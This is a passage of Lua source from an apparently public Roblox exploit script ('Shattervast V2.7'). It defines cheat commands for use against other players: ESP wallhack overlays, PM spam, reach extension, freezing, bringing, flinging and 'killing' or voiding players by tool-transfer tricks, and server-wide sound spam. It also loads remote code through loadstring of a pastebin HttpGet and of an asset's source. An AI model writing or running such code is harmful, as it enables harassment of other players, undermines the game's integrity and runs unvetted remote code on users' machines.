    end
end

Commands.pmspam = function(args)
    if args[1] then
        local gotPlayer = ""
        for i,v in pairs(findPlayer(args[1])) do
            gotPlayer = v
        end
        table.remove(args, 1)
        local pmSpamMsg = table.concat(args," ")
        spamtext = "/w "..gotPlayer.Name.." "..pmSpamMsg
        spamming = true
    end
end

Commands.unpmspam = function(args)
    spamming = false
end

Commands.wsvis = function(args)
    if args[1] then
        for i,v in pairs(gsWorkspace:GetDescendants()) do
            if v:IsA("Part") or v:IsA("Decal") then
                if tonumber(args[1]) > 1 then
                    v.Transparency = 0.5
                else
                    v.Transparency = args[1]
                end
            end
        end
    end
    clientSided()
end

Commands.bringobj = function(args)
    if args[1] then
        local Object = ""
        for i,v in pairs(gsWorkspace:GetDescendants()) do
            if string.lower(v.Name) == string.lower(args[1]) then
                Object = v              
            end
        end
        if Object == "" then
            Notification("warning", "Object was not found in the workspace.", 6)
        end
        if args[2] then
            Object.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * args[2]
        else
            Object.CFrame = LP.Character.HumanoidRootPart.CFrame + LP.Character.HumanoidRootPart.CFrame.lookVector * 3
        end
        clientSided()
    end
end

CBRINGplr = ""
cbringing = false
cbringingall = false
Commands.cbring = function(args)
    if args[1] then
        if string.lower(tostring(args[1])) == "all" or string.lower(tostring(args[1])) == "others" then
            cbringingall = true
        else
            for i,v in pairs(findPlayer(args[1])) do
                CBRINGplr = v
                cbringing = true
            end
        end
        if args[2] then
            CBRINGamount = args[2]
        else
            CBRINGamount = 3
        end
        clientSided()
    end
end

Commands.uncbring = function(args)
    cbringing = false
    cbringingall = false
end

Commands.cfreeze = function(args)
    if args[1] then
        for i,v in pairs(findPlayer(args[1])) do
            v.Character.HumanoidRootPart.Anchored = true
        end
        clientSided()
    end
end

Commands.uncfreeze = function(args)
    if args[1] then
        for i,v in pairs(findPlayer(args[1])) do
            v.Character.HumanoidRootPart.Anchored = false
        end
    else
        for i,all in pairs(gsPlayers:GetPlayers()) do
            all.Character.HumanoidRootPart.Anchored = false
        end
    end
end

Commands.unattach = function(args)
    local function getout(player,player2)
    local char1,char2=player.Character,player2.Character
    if char1 and char2 then
    char1:MoveTo(char2.Head.Position)
    end
    end
    getout(LP, LP)
end

currentToolSize = ""
Commands.reach = function(args)
    if args[1] then
        for i,v in pairs(LP.Character:GetDescendants()) do
            if v:IsA("Tool") then
                if string.lower(tostring(args[1])) == "off" then
                    v.Handle.Size = currentToolSize
                    v.Handle.SelectionBoxCreated:Destroy()
                    LP.Character.Humanoid:UnequipTools()
                elseif string.lower(tostring(args[1])) == "on" then
                    if args[2] then
                        currentToolSize = v.Handle.Size
                        local a = Instance.new("SelectionBox",v.Handle)
                        a.Name = "SelectionBoxCreated"
                        a.Adornee = v.Handle
                        v.Handle.Size = Vector3.new(0.5,0.5,args[2])
                        v.GripPos = Vector3.new(0,0,0)
                        LP.Character.Humanoid:UnequipTools()
                    else
                        currentToolSize = v.Handle.Size
                        local a = Instance.new("SelectionBox",v.Handle)
                        a.Name = "SelectionBoxCreated"
                        a.Adornee = v.Handle
                        v.Handle.Size = Vector3.new(0.5,0.5,60)
                        v.GripPos = Vector3.new(0,0,0)
                        LP.Character.Humanoid:UnequipTools()
                    end
                end
            end
        end
    end
end

Commands.droptool = function(args)
    for i,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("Tool") then
            v.Parent = gsWorkspace
        end
    end
    for i,a in pairs(LP.Backpack:GetDescendants()) do
        if a:IsA("Tool") then
            a.Parent = gsWorkspace
        end
    end
end

Commands.drophats = function(args)
    for i,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("Accessory") or v:IsA("Hat") then
            v.Parent = gsWorkspace
        end
    end
end

Commands.hidecmdbar = function(args)
    CMDBAR.Visible = false
end

Commands.showcmdbar = function(args)
    CMDBAR.Visible = true
end

Commands.prefix = function(args)
    if args[1] then
        commandPrefix = string.sub(tostring(args[1]), 1, 1)
        fullUpdate()
    end
end

Commands.removeinvis = function(args)
    for i,v in pairs(gsWorkspace:GetDescendants()) do
        if v:IsA("Part") and v.Name ~= "HumanoidRootPart" then
            if v.Transparency == 1 then
                v:Destroy()
            end
        end
    end
    clientSided()
end

Commands.removefog = function(args)
    gsLighting.FogStart = 0
    gsLighting.FogEnd = 9999999999999
    clientSided()
end

Commands.animation = function(args)
    if args[1] then
        if string.lower(tostring(args[1])) == "gui" then
            loadstring(game:HttpGet(("https://pastebin.com/raw/mdbTSP4d"),true))()
        else
            local Anim = Instance.new("Animation")
            Anim.AnimationId = "rbxassetid://".. tostring(args[1])
            local track = LP.Character.Humanoid:LoadAnimation(Anim)
            if args[2] then
                track:Play(.1, 1, args[2])
            else
                track:Play(.1, 1, 1)
            end
        end
    end
end

Commands.btools = function(args)
    local Clone_T = Instance.new("HopperBin",LP.Backpack)
    Clone_T.BinType = "Clone"
    local Destruct = Instance.new("HopperBin",LP.Backpack)
    Destruct.BinType = "Hammer"
    local Hold_T = Instance.new("HopperBin",LP.Backpack)
    Hold_T.BinType = "Grab"
    clientSided()
end

Commands.esp = function(args)
    if args[1] then
        for i,v in pairs(findPlayer(args[1])) do
            local espPlayer = v
            for i,createESP in pairs(espPlayer.Character:GetDescendants()) do
                if createESP:IsA("Part") or createESP:IsA("MeshPart") then
                    if createESP.Name ~= "HumanoidRootPart" and createESP.Name ~= "Handle" then
                        local current = true
                        local espBOX = Instance.new("BoxHandleAdornment")
                        espBOX.Parent = gsCoreGui
                        espBOX.Name = "rGET"..espPlayer.Name
                        espBOX.Adornee = createESP
                        espBOX.AlwaysOnTop = true
                        espBOX.ZIndex = 0
                        espBOX.Size = createESP.Size
                        espBOX.Transparency = 0.3
                        local AboveHead = Instance.new("BillboardGui")
                        AboveHead.Parent = gsCoreGui
                        AboveHead.Adornee = espPlayer.Character.Head
                        AboveHead.Name = "rGET"..espPlayer.Name
                        AboveHead.Size = UDim2.new(0, 100, 0, 100)
                        AboveHead.StudsOffset = Vector3.new(0, 1, 0)
                        AboveHead.AlwaysOnTop = true
                        local Info = Instance.new("TextLabel")
                        Info.Parent = AboveHead
                        Info.BackgroundTransparency = 1
                        Info.Position = UDim2.new(0, 0, 0, 0)
                        Info.Size = UDim2.new(1, 0, 0, 40)
                        Info.TextColor3 = Color3.fromRGB(200,200,200)
                        Info.TextStrokeTransparency = 0.5
                        Info.TextSize = 15
                        if espPlayer.TeamColor == LP.TeamColor then
                            espBOX.Color = BrickColor.new("Lime green")
                            Info.TextStrokeColor3 = Color3.fromRGB(10,100,10)
                        else
                            espBOX.Color = BrickColor.new("Really red")
                            Info.TextStrokeColor3 = Color3.fromRGB(100,10,10)
                        end
                        game:GetService('RunService').Stepped:connect(function()
                            if current and LP.Character.Humanoid and espPlayer.Character.HumanoidRootPart then
                                Info.Text = espPlayer.Name.." (".. math.floor((LP.Character.HumanoidRootPart.Position - espPlayer.Character.HumanoidRootPart.Position).magnitude)..")"
                            end
                        end)
                        espPlayer.Character.Humanoid.Died:Connect(function()
                            current = false
                            espBOX:Destroy()
                            AboveHead:Destroy()
                        end)
                        gsPlayers.PlayerRemoving:Connect(function(plr)
                            if plr == espPlayer then
                                current = false
                                espBOX:Destroy()
                                AboveHead:Destroy()
                            end
                        end)
                    end
                end
            end
        end
        clientSided()
    end
end

Commands.unesp = function(args)
    if not args[1] then
        for i,v in pairs(gsCoreGui:GetDescendants()) do
            if string.sub(v.Name, 1, 4) == "rGET" then
                v:Destroy()
            end
        end
    else
        for i,v in pairs(gsCoreGui:GetDescendants()) do
            if string.sub(v.Name, 1, 4) == "rGET" then
                for i,a in pairs(findPlayer(args[1])) do
                    if string.sub(v.Name, 5) == a.Name then
                        v:Destroy()
                    end
                end
            end
        end
    end
end

Commands.dice = function(args)
    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("You rolled a dice for ".. tostring(math.random(1, 6)), "All")
end

Commands.random = function(args)
    if args[1] and args[2] then
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Picking random number between "..args[1].." and "..args[2].."... The number is ".. tostring(math.random(args[1], args[2])), "All")
    end
end

Commands.closegame = function(args)
    game:Shutdown()
end

Commands.savetool = function(args)
    if args[1] then
        for i,a in pairs(LP.Character:GetDescendants()) do
            if a:IsA("Tool") and string.lower(a.Name) == string.lower(tostring(args[1])) then
                a.Parent = LP
                local oldName = a.Name
                a.Name = "saved "..oldName
            else
                for i,n in pairs(LP.Backpack:GetDescendants()) do
                    if n:IsA("Tool") and string.lower(n.Name) == string.lower(tostring(args[1])) then
                        n.Parent = LP
                        local sOldName = n.Name
                        n.Name = "saved "..sOldName
                    end
                end
            end
        end
    else
        for i,v in pairs(LP.Character:GetDescendants()) do
            if v:IsA("Tool") then
                v.Parent = LP
                local oldName = v.Name
                v.Name = "saved "..oldName
            end
        end
    end
end

Commands.loadtool = function(args)
    if args[1] then
        for i,a in pairs(LP:GetChildren()) do
            if a:IsA("Tool") and string.sub(a.Name, 1, 5) == "saved" and string.lower(string.sub(a.Name, 7)) == string.lower(tostring(args[1])) then
                a.Parent = LP.Backpack
                local currentName = a.Name
                a.Name = string.sub(currentName, 7)
            end
        end
    else
        for i,v in pairs(LP:GetChildren()) do
            if string.sub(v.Name, 1, 5) == "saved" then
                v.Parent = LP.Backpack
                local currentName = v.Name
                v.Name = string.sub(currentName, 7)
            end
        end
    end
end

Commands.savealltool = function(args)
    for i,v in pairs(LP.Character:GetDescendants()) do
        if v:IsA("Tool") then
            v.Parent = LP
            local oldName = v.Name
            v.Name = "saved "..oldName
        end
    end
    for i,v in pairs(LP.Backpack:GetDescendants()) do
        if v:IsA("Tool") then
            v.Parent = LP
            local oldName = v.Name
            v.Name = "saved "..oldName
        end
    end
end

Commands.loadalltool = function(args)
    for i,v in pairs(LP:GetChildren()) do
        if v:IsA("Tool") and string.sub(v.Name, 1, 5) == "saved" then
            v.Parent = LP.Backpack
            local currentName = v.Name
            v.Name = string.sub(currentName, 7)
        end
    end
end

Mouse.KeyDown:Connect(function(key) 
    if key == clicktpKEY and clicktpACTIVE == true then 
        if Mouse.Target then 
            LP.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.x, Mouse.Hit.y + 5, Mouse.Hit.z)
        end 
    end
    if key == clickdelKEY and clickdelACTIVE == true then 
        if Mouse.Target then 
            Mouse.Target:Destroy()
        end 
    end
end)
Mouse.Button1Down:Connect(function()
    if clicktpACTIVE == true and clicktpCLICK == true then
        if Mouse.Target then 
            LP.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.x, Mouse.Hit.y + 5, Mouse.Hit.z)
        end 
    end
    if clickdelACTIVE == true and clickdelCLICK == true then
        if Mouse.Target then
            Mouse.Target:Destroy()
        end
    end
end)

clicktpKEY = ""
clickdelKEY = ""
clicktpACTIVE = false
clickdelACTIVE = false
clicktpCLICK = false
clickdelCLICK = false

Commands.clicktp = function(args)
    if args[1] then
        clicktpKEY = string.sub(tostring(args[1]), 1, 1)
        clicktpACTIVE = true
        clicktpCLICK = false
    else
        clicktpKEY = ""
        clicktpACTIVE = true
        clicktpCLICK = true
    end
    clientSided()
end

Commands.clickdel = function(args)
    if args[1] then
        clickdelKEY = string.sub(tostring(args[1]), 1, 1)
        clickdelACTIVE = true
        clickdelCLICK = false
    else
        clickdelKEY = ""
        clickdelACTIVE = true
        clickdelCLICK = true
    end
    clientSided()
end

Commands.unclicktp = function(args)
    clicktpACTIVE = false
end

Commands.unclickdel = function(args)
    clickdelACTIVE = false
end

Commands.oof = function(args)
    spawn(function()
        while wait() do
           for i,v in pairs(game:GetService'Players':GetPlayers()) do
               if v.Character ~= nil and v.Character:FindFirstChild'Head' then
                   for _,x in pairs(v.Character.Head:GetChildren()) do
                       if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true, true) end
                   end
               end
           end
        end
    end)
end

Commands.chatlogs = function(args)
    MainChatFrame.Position = UDim2.new(0, 760, 0, 261)
    MainChatFrame.Visible = true
end

Commands.stopadmin = function(args)
    commandPrefix = "     "
    following = false
    trailing = false
    annoying = false
    CMDBAR.Visible = false
    Match.Visible = false
    flying = false
end

Commands.freecam = function(args)
    for i,getFC in pairs(gsWorkspace:GetDescendants()) do
        if getFC.Name == "rGETpartNUMBER2" then
            getFC:Destroy()
        end
    end
    local CameraPart = Instance.new("Part")
    CameraPart.CanCollide = false
    CameraPart.CFrame = LP.Character.Head.CFrame
    CameraPart.Locked = true
    CameraPart.Transparency = 1
    CameraPart.Size = Vector3.new(1, 1, 1)
    CameraPart.Parent = gsWorkspace
    CameraPart.Name = "rGETpartNUMBER2"
    if bypassMODE == true then
        loopviewfc = true
    elseif bypassMODE == false then
        gsWorkspace.CurrentCamera.CameraSubject = CameraPart
    end
    local speedget = 1
    local T = CameraPart
    local CONTROL = {F = 0, B = 0, L = 0, R = 0}
    local lCONTROL = {F = 0, B = 0, L = 0, R = 0}
    local SPEED = speedget
    if args[1] then
        speedfly = tonumber(args[1])
    else
        speedfly = 1
    end
    local function freecamfly()
        LP.Character.Head.Anchored = true
        doFREECAM = true
        local BG = Instance.new('BodyGyro', T)
        local BV = Instance.new('BodyVelocity', T)
        BG.P = 9e4
        BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
        BG.cframe = T.CFrame
        BV.velocity = Vector3.new(0, 0.1, 0)
        BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
        spawn(function()
        repeat wait()
        if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 then
        SPEED = 50
        elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0) and SPEED ~= 0 then
        SPEED = 0
        end
        if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 then
        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
        lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
        elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and SPEED ~= 0 then
        BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
        else
        BV.velocity = Vector3.new(0, 0.1, 0)
        end
        BG.cframe = workspace.CurrentCamera.CoordinateFrame
                until not doFREECAM
                CONTROL = {F = 0, B = 0, L = 0, R = 0}
                lCONTROL = {F = 0, B = 0, L = 0, R = 0}
                SPEED = 0
                BG:destroy()
                BV:destroy()
            end)
        end
    Mouse.KeyDown:connect(function(KEY)
        if KEY:lower() == 'w' then
            CONTROL.F = speedfly
        elseif KEY:lower() == 's' then
            CONTROL.B = -speedfly
        elseif KEY:lower() == 'a' then
            CONTROL.L = -speedfly 
        elseif KEY:lower() == 'd' then 
            CONTROL.R = speedfly
        end
    end)
    Mouse.KeyUp:connect(function(KEY)
        if KEY:lower() == 'w' then
            CONTROL.F = 0
        elseif KEY:lower() == 's' then
            CONTROL.B = 0
        elseif KEY:lower() == 'a' then
            CONTROL.L = 0
        elseif KEY:lower() == 'd' then
            CONTROL.R = 0
        end
    end)
    freecamfly()
end

Commands.fc = function(args)
    if args[1] then
        run(commandPrefix.."freecam "..args[1])
    else
        run(commandPrefix.."freecam")
    end
end

Commands.unfreecam = function(args)
    doFREECAM = false
    LP.Character.Head.Anchored = false
    view(LP)
    if gsWorkspace.rGETpartNUMBER2 then
        gsWorkspace.rGETpartNUMBER2:Destroy()
    end
    loopviewfc = false
end

Commands.unfc = function(args)
    doFREECAM = false
    LP.Character.Head.Anchored = false
    view(LP)
    if gsWorkspace.rGETpartNUMBER2 then
        gsWorkspace.rGETpartNUMBER2:Destroy()
    end
    loopviewfc = false
end

Commands.gotofc = function(args)
    doFREECAM = false
    LP.Character.Head.Anchored = false
    view(LP)
    pcall(function()
        LP.Character.HumanoidRootPart.CFrame = gsWorkspace.rGETpartNUMBER2.CFrame
        gsWorkspace.rGETpartNUMBER2:Destroy()
    end)
    loopviewfc = false
end

Commands.fctp = function(args)
    if args[1] then
        for i,v in pairs(findPlayer(args[1])) do
            pcall(function()
                gsWorkspace.rGETpartNUMBER2.CFrame = v.Character.Head.CFrame
            end)
        end
    end
end

Commands.cmds = function(args)
    CMDSmain.Position = UDim2.new(0, 695, 0, 297)
    CMDSmain.Visible = true
    CMDSmain:TweenSize(UDim2.new(0, 440, 0, 367), "InOut", "Sine", 1)
end

Commands.fullcredits = function(args)
    Notification("info", "Credit to Autumn, Josh and 3dsboy08 (Help with "..commandPrefix.."remotespy and anti client kick)", 1)
    Notification("info", "Credit to Infinite Yield developers (Assisted in "..commandPrefix.."esp and "..commandPrefix.."fly commands)", 1)
    Notification("info", "Credit to Timeless ("..commandPrefix.."invisible) and Harkinian ("..commandPrefix.."shutdown)", 1)
    Notification("info", "Credit to DEX creators ("..commandPrefix.."explorer) and xFunnieuss ("..commandPrefix.."spinhats)", 1)
    Notification("info", "Only creator is illremember", 2)
end

Commands.hotkey = function(args)
    if args[1] then
        local hotkeyKEY = string.sub(tostring(args[1]), 1, 3)
        if args[2] then
            table.remove(args, 1)
            local hotkeyCMD = table.concat(args, " ")
            table.insert(hotkeys, hotkeyCMD.."//"..hotkeyKEY)
            fullUpdate()
            Notification("info", "Hotkey added!", 1)
        end
    end
end

Mouse.KeyDown:Connect(function(key)
    for i,v in pairs(hotkeys) do
        local currentKey = string.match(v, "[%a%d]+$")
        if string.len(currentKey) == 1 then
            if key == string.sub(v, #v, #v) then
                local commandtoRUN = string.match(v, "^[%w%s]+")
                if string.sub(string.lower(tostring(commandtoRUN)), 1, 3) == "fly" then
                    if flying == false then
                        run(commandPrefix..tostring(commandtoRUN))
                    else
                        run(commandPrefix.."unfly")
                    end
                elseif tostring(commandtoRUN) == "noclip" then
                    if noclip == false then
                        run(commandPrefix..tostring(commandtoRUN))
                    else
                        run(commandPrefix.."clip")
                    end
                elseif tostring(commandtoRUN) == "freecam" or tostring(commandtoRUN) == "fc" then
                    if doFREECAM == false then
                        run(commandPrefix..tostring(commandtoRUN))
                    else
                        if fchotkeymode == "goto" then
                            run(commandPrefix.."gotofc")
                        elseif fchotkeymode == "unfc" then
                            run(commandPrefix.."unfreecam")
                        end
                    end
                else
                    run(commandPrefix..tostring(commandtoRUN))
                end
            end
        else
            if string.lower(string.sub(tostring(currentKey), 1, 1)) == "f" then
                local commandtoRUN = string.match(v, "^[%w%s]+")
                local hotkeyadjust = tonumber(string.sub(currentKey, 2, 3)) + 25
                if string.byte(key) == hotkeyadjust then
                    if string.sub(string.lower(tostring(commandtoRUN)), 1, 3) == "fly" then
                        if flying == false then
                            run(commandPrefix..tostring(commandtoRUN))
                        else
                            run(commandPrefix.."unfly")
                        end
                    elseif tostring(commandtoRUN) == "noclip" then
                        if noclip == false then
                            run(commandPrefix..tostring(commandtoRUN))
                        else
                            run(commandPrefix.."clip")
                        end
                    elseif tostring(commandtoRUN) == "freecam" or tostring(commandtoRUN) == "fc" then
                        if doFREECAM == false then
                            run(commandPrefix..tostring(commandtoRUN))
                        else
                            if fchotkeymode == "goto" then
                                run(commandPrefix.."gotofc")
                            elseif fchotkeymode == "unfc" then
                                run(commandPrefix.."unfreecam")
                            end
                        end
                    else
                        run(commandPrefix..tostring(commandtoRUN))
                    end
                end
            end
        end
    end
end)

Commands.removeallhotkey = function(args)
    hotkeys = {}
    fullUpdate()
    Notification("warning", "All hotkeys reset/removed", 6)
end

Commands.removehotkey = function(args)
    if args[1] then
        for i,v in pairs(hotkeys) do
            local currentKey = string.match(v, "[%a%d]+$")
            if currentKey == string.lower(tostring(args[1])) then
                table.remove(hotkeys, i)
                fullUpdate()
            end
        end
    end
end

Commands.printhotkeys = function(args)
    for i,v in pairs(hotkeys) do
        warn("HOTKEYS:")
        print(v)
    end
end

Commands.os = function(args)
    if args[1] then
        for i,v in pairs(findPlayer(args[1])) do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v.Name.." is on "..v.OsPlatform, "All")
        end
    end
end

spinning = false
Commands.spin = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            run(commandPrefix.."attach "..v.Name)
            annplr = v
            annoying = true
            spinning = true
        end
    end
end

Commands.unspin = function(args)
    if spinning then
        annoying = false
        spinning = false
    end
    run(""..commandPrefix.."unattach")
end

Commands.explorer = function(args)
    loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)()
    Notification("info", "Loaded DEX explorer!", 5)
end

Commands.maxzoom = function(args)
    if args[1] then
        LP.CameraMaxZoomDistance = args[1]
    end
end

Commands.stare = function(args)
    if args[1] then
        for i,v in pairs(findSinglePlayer(args[1])) do
            stareplr = v
            staring = true
        end
    end
end

Commands.unstare = function(args)
    staring = false
end

Commands.tempgod = function(args)
    local hu = LP.Character.Humanoid
    local l = Instance.new("Humanoid")
    l.Parent = LP.Character
    l.Name = "Humanoid"
    wait(0.1)
    hu.Parent = LP
    gsWorkspace.CurrentCamera.CameraSubject = LP.Character
    LP.Character.Animate.Disabled = true
    wait(0.1)
    LP.Character.Animate.Disabled = false
    Notification("info", "Enabled Temp FE Godmode", 4)
end

Commands.void = function(args)
    if hasTools() == false then
        Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
    else
        FEGodmode()
        for i,v in pairs(LP.Backpack:GetChildren())do
            LP.Character.Humanoid:EquipTool(v)
        end
        if args[1] then
            for i,v in pairs(findSinglePlayer(args[1])) do
                local NOW = LP.Character.HumanoidRootPart.CFrame
                LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
                wait(0.3)
                LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                wait(0.5)
                LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(999999999999999,0,999999999999999))
            end
        end
    end
end

Commands.freefall = function(args)
    if hasTools() == false then
        Notification("warning", "You need a tool in your backpack/inventory to use this command.", 8)
    else
        FEGodmode()
        for i,v in pairs(LP.Backpack:GetChildren())do
            LP.Character.Humanoid:EquipTool(v)
        end
        if args[1] then
            for i,v in pairs(findSinglePlayer(args[1])) do
                local NOW = LP.Character.HumanoidRootPart.CFrame
                LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
                wait(0.3)
                LP.Character.HumanoidRootPart.CFrame = v.Character["Left Arm"].CFrame
                wait(0.5)
                LP.Character.HumanoidRootPart.CFrame = NOW
                wait(0.5)
                LP.Character.HumanoidRootPart.CFrame = NOW
                wait(0.6)
                LP.Character.HumanoidRootPart.CFrame = CFrame.new(0,50000,0)
            end
        end
    end
end

Commands.version = function(args)
    Notification("info", "Current Shattervast Version: V2.7", 7)
end

Commands.shiftlockon = function(args)
    LP.DevEnableMouseLock = true
    Notification("info", "Shift lock enabled!", 5)
end

for i,needChat in pairs(gsPlayers:GetPlayers()) do
    needChat.Chatted:Connect(function(msg)
        if copychatall then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
        end
    end)
end
gsPlayers.PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(msg)
        if copychatall then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
        end
    end)
end)

copychatplayer = nil
copychatall = false
copychatACTIVE = false
Commands.copychat = function(args)
    if args[1] then
        if string.lower(args[1]) == "all" or string.lower(args[1]) == "others" then
            copychatall = true
        else
            for i,v in pairs(findPlayer(args[1])) do
                if v ~= LP then
                    copychatplayer = v
                    copychatACTIVE = true
                end
            end
        end
    end
end

Commands.uncopychat = function(args)
    copychatall = false
    copychatACTIVE = false
end

Commands.newkill =  function(args)
    if hasTools() == false then
        Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
    else
        if args[1] then
            for i,plr in pairs(findSinglePlayer(args[1])) do
                for i,v in pairs(LP.Backpack:GetChildren())do
                    LP.Character.Humanoid:EquipTool(v)
                end 
                for i,v in pairs(LP.Backpack:GetDescendants()) do
                    if v:IsA("Tool") then
                        v.Parent = LP.Character
                        wait()
                        v.Parent = plr.Character
                    end
                end
                wait(0.4)
                LP.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(4000000, -10, 200000))
            end
        end
    end
end

Commands.newattach =  function(args)
    if hasTools() == false then
        Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
    else
        if args[1] then
            for i,plr in pairs(findSinglePlayer(args[1])) do
                for i,v in pairs(LP.Backpack:GetChildren())do
                    LP.Character.Humanoid:EquipTool(v)
                end 
                for i,v in pairs(LP.Backpack:GetDescendants()) do
                    if v:IsA("Tool") then
                        v.Parent = LP.Character
                        wait()
                        v.Parent = plr.Character
                    end
                end
            end
        end
    end
end

Commands.newbring =  function(args)
    if hasTools() == false then
        Notification("warning", "You need TWO tools in your backpack/inventory to use this command.", 8)
    else
        if args[1] then
            for i,plr in pairs(findSinglePlayer(args[1])) do
                local NOW = LP.Character.HumanoidRootPart.CFrame
                for i,v in pairs(LP.Backpack:GetChildren())do
                    LP.Character.Humanoid:EquipTool(v)
                end 
                for i,v in pairs(LP.Backpack:GetDescendants()) do
                    if v:IsA("Tool") then
                        v.Parent = LP.Character
                        wait()
                        v.Parent = plr.Character
                    end
                end
                wait(0.4)
                LP.Character.HumanoidRootPart.CFrame = NOW
                wait(0.4)
                LP.Character.HumanoidRootPart.CFrame = NOW
            end
        end
    end
end

Commands.spawn = function(args)
    if args[1] then
        if string.lower(tostring(args[1])) == "ws" then
            spawnWS = args[2] or CurrentWalkspeed
            LP.Character.Humanoid.WalkSpeed = args[2] or CurrentWalkspeed
        elseif string.lower(tostring(args[1])) == "jp" then
            spawnJP = args[2] or CurrentJumppower
            LP.Character.Humanoid.JumpPower = args[2] or CurrentJumppower
        elseif string.lower(tostring(args[1])) == "hh" then
            spawnHH = args[2] or CurrentHipheight
            LP.Character.Humanoid.HipHeight = args[2] or CurrentHipheight
        elseif string.lower(tostring(args[1])) == "god" then
            spawningfegod = true
            FEGodmode()
        end
    end
end

Commands.unspawn = function(args)
    spawnWS = CurrentWalkspeed
    spawnJP = CurrentJumppower
    spawnHH = CurrentHipheight
    spawningfegod = false
    Notification("info", "Reset spawning stats", 5)
end

savingtoolsloop = false
Commands.autosavetool = function(args)
    if args[1] then
        if string.lower(tostring(args[1])) == "on" then
            savingtoolsloop = true
        elseif string.lower(tostring(args[1])) == "off" then
            savingtoolsloop = false
        end
    end
end

modeFling = false
modeCompliment = false
modeMove = false
modeInfo = false
Commands.beginbot = function(args)
    if not args[1] then
        print("fling // compliment // move // info")
        Notification("info", ""..commandPrefix.."beginbot Modes printed", 5)
    else
        if string.lower(tostring(args[1])) == "fling" then
            modeFling = true
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hello! I am Fling-Bot 5000! Say !fling [Player] to fling that player!", "All")
        elseif string.lower(tostring(args[1])) == "compliment" then
            modeCompliment = true
            complimentReady = true
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Good day, I am Compliment-Bot. Say !c [Player] to give them a compliment.", "All")
        elseif string.lower(tostring(args[1])) == "move" then
            modeMove = true
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hi, I am movement bot. Commands you can use: !walk [Player], !bringbot, !follow [Player].", "All")
        elseif string.lower(tostring(args[1])) == "info" then
            modeInfo = true
            infoReady = true
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Hey, I'm Info-Bot. Commands you can use: !age [Player], !id [Player].", "All")
        end
    end
end

Commands.endbot = function(args)
    if not args[1] then
        modeFling = false
        modeCompliment = false
        modeMove = false
        modeInfo = false
    else
        if string.lower(tostring(args[1])) == "fling" then
            modeFling = false
        elseif string.lower(tostring(args[1])) == "compliment" then
            modeCompliment = false
        elseif string.lower(tostring(args[1])) == "move" then
            modeMove = false
        elseif string.lower(tostring(args[1])) == "info" then
            modeInfo = false
        end
    end
end

Commands.stopsit = function(args)
    stopsitting = true
end

Commands.gosit = function(args)
    stopsitting = false
end

chattingerror = true
Commands.chaterror = function(args)
    if chattingerror then
        chattingerror = false
        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(" ", "All")
